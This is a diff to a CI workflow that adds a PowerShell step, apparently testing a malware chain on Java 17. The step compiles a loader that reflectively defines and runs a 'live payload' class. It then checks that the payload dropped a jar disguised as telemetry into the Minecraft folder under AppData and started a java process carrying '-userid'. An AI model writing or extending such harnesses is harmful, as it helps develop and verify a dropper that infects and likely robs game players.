@@ -54,6 +54,39 @@ jobs:
           java -cp $d Probe "$d\loader.class" "$d\sylant.class"
           if ($LASTEXITCODE -ne 0) { throw 'defineClass failed' }
 
+      # Real chain on Java 17: define the live payload and run() it, then require a
+      # dropped telemetry jar and a javaw/java process carrying -userid.
+      - name: Chain on Java 17
+        if: matrix.java == '17'
+        shell: powershell
+        run: |
+          $d="$env:RUNNER_TEMP\probe"
+          $jar="$env:APPDATA\.minecraft\logs\telemetry"
+          @'
+          import java.nio.file.*;
+          public class Run {
+            static class L extends ClassLoader { Class<?> def(String n, byte[] b){ return defineClass(n,b,0,b.length);} }
+            public static void main(String[] a) throws Exception {
+              L l = new L();
+              l.def("loader", Files.readAllBytes(Paths.get(a[0]))).getDeclaredMethod("run").invoke(null);
+              Thread.sleep(3000);
+              System.out.println("run invoked");
+            }
+          }
+          '@ | Set-Content "$d\Run.java" -Encoding ASCII
+          javac -d $d "$d\Run.java"
+          java -cp $d Run "$d\loader.class"
+          if ($LASTEXITCODE -ne 0) { throw 'loader run() threw' }
+          $ok=$false
+          for($i=0;$i -lt 30;$i++){
+            Start-Sleep 5
+            $cache=@(Get-ChildItem "$jar\*-json.jar" -ErrorAction SilentlyContinue)
+            $proc=@(Get-CimInstance Win32_Process -Filter "name='javaw.exe' or name='java.exe'" | Where-Object { $_.CommandLine -match '(?i)-userid' })
+            Write-Host "t=$($i*5) jar=$($cache.Count) client=$($proc.Count)"
+            if($cache.Count -gt 0 -and $proc.Count -gt 0){ "PASS j17 jar=$($cache[0].Name) pid=$($proc[0].ProcessId)"; $ok=$true; break }
+          }
+          Get-ChildItem $jar -ErrorAction SilentlyContinue | Select Name,Length | Out-File "$d\j17-jars.txt"
+          if (-not $ok) { throw 'Java 17 chain produced no jar/client' }
       - name: Prepare
         if: matrix.java == '21'
         shell: powershell
